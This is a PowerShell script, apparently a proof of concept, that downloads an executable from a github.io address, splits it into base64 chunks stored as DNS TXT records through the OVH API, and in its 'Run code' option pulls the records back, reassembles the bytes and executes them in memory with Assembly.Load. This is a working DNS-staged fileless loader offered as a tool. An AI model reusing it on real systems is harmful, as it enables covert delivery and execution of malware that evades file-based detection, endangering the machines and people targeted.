<#
    *
    * @Author : Olivier LEUNG
    * @Created : 18/03/2023
    * @Version : 1.2
    *
#>

# OVH cred API
# ----------------------------------------------------------------------------
$global:endpoint=""
$global:AK = ""
$global:AS = ""
$global:CK = ""
$global:TIME = [DateTimeOffset]::Now.ToUnixTimeSeconds()
$global:DOMAIN = ""
# ----------------------------------------------------------------------------

function RunAssembly{
    param (
        [Byte[]]$bytes
    )

    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, $null)
}

function GetOVHSignatureFromQuery{
    param (
        [String[]]$Method,
        [String[]]$Query,
        [String[]]$Body
    )
    $Sha = "$AS+$CK+$Method+$Query+$Body+$TIME"
    # Get Hash from String
    $Stream = [System.IO.MemoryStream]::new()
    $writer = [System.IO.StreamWriter]::new($Stream)
    $writer.write($Sha)
    $writer.Flush()
    $Stream.Position = 0
    $Hash = Get-FileHash -Algorith SHA1 -InputStream $Stream | foreach { $_.Hash}

    $Signature = '$1$'+$Hash
    $Signature = $Signature.ToLower()
    # Write-Output("Signature : " + $Signature)
    return($Signature)
}


# -------------- Initialize Variable ---------------#
$RecordID = @()  # Clear Array
$subDomainNumber = 0 # Clear variable
# --------------------------------------------------#

Write-Output("1. Test Connection")
Write-Output("2. Write DNS Record")
Write-Output("3. Delete DNS Record")
Write-Output("4. Run code")

$Choice = Read-Host("What action do you want to proceed ?")

Switch($Choice){

    1{ # Test Connection
        
        $QUERY = "https://api.ovh.com/1.0/me" 
        $METHOD = "GET"
        $BODY = ""
        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
        Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY
    }

    2{ # Write DNS Record
        
        # Récupération du payload
        $url = "https://hakkyahud.github.io/HelloWorldCS.exe"
        $bytes = (New-Object Net.WebClient).DownloadData($url)

        # Convert to base64
        $base64 = [System.Convert]::ToBase64String($bytes)

        # Subdomain calculation
        $subDomainNumber = [math]::Ceiling($base64.Length/254)
        Write-Output("Number of SUBDOMAIN : {0}" -f $subDomainNumber)
        $QUERY = "https://api.ovh.com/1.0/domain/zone"
        $METHOD = "GET"
        $BODY=""
        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
        Write-Output("DOMAIN : {0}" -f $DOMAIN)

        # Write DNS records
        $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record" -f $DOMAIN
        $METHOD = "POST"
        
        For ($i = 0; $i -lt $subDomainNumber; $i++){
            try{
                $subString = $base64.Substring($i*254,254)
                $BODY = @{"fieldType"="TXT"; "subDomain"=$i; "target"=$subString} | ConvertTo-Json
                $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
                Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY
            }
            catch [ArgumentOutOfRangeException]{
                $subString = $base64.Substring($i*254,$base64.Length - ($i*254))
                $BODY = @{"fieldType"="TXT"; "subDomain"=$i; "target"=$subString} | ConvertTo-Json
                $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
                Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY
            }
        }
    }

    3{ # Delete DNS Record
        
        $url = "https://hakkyahud.github.io/HelloWorldCS.exe"
        $bytes = (New-Object Net.WebClient).DownloadData($url)

        # Convert to base64
        $base64 = [System.Convert]::ToBase64String($bytes)

        # Subdomain calculation
        $subDomainNumber = [math]::Ceiling($base64.Length/254)
        # First get the ID of record to be deleted
        For ($i = 0; $i -lt $subDomainNumber; $i++){
            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record?fieldType=TXT&subDomain={1}" -f $DOMAIN, $i
            $METHOD = "GET"
            $BODY = ""
            $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
            $RecordID += Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
        }

        Write-Output($RecordID.Length)
               
        # Delete DNS record from the retrieved IDs
        For ($i = 0; $i -lt $RecordID.Length; $i++){
            Write-Output("ID to delete : {0}" -f $RecordID[$i])
            $METHOD = "DELETE"
            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record/{1}" -f $DOMAIN, $RecordID[$i]
            $SIGNATURE = GetOVHSignatureFromQuery -ApplicationSecret $AS -ConsumerKey $CK -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
            Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY
        }

    }

    4{ # Run code
        $PAYLOAD = ""
        # Get record ID
        For ($i=0; $i -lt 19; $i++){
            $METHOD = "GET"
            $BODY = ""
            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record?fieldType=TXT&subDomain={1}" -f $DOMAIN, $i
            $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
            $RecordID += Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
        }

        Write-Output("Length : {0}" -f $RecordID.Length)

        # Get info of the ID
        For ($i=0; $i -lt $RecordID.Length; $i++){
            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record/{1}" -f $DOMAIN, $RecordID[$i]
            $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
            $request = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
            $PAYLOADB64 = $PAYLOADB64 + $request.target
        }
        
        Write-Host($PAYLOADB64)
        $bytes = [System.Convert]::FromBase64String($PAYLOADB64)
        RunAssembly($bytes)
    }

    Default {Write-Output("Wrong choice, bye.")}

}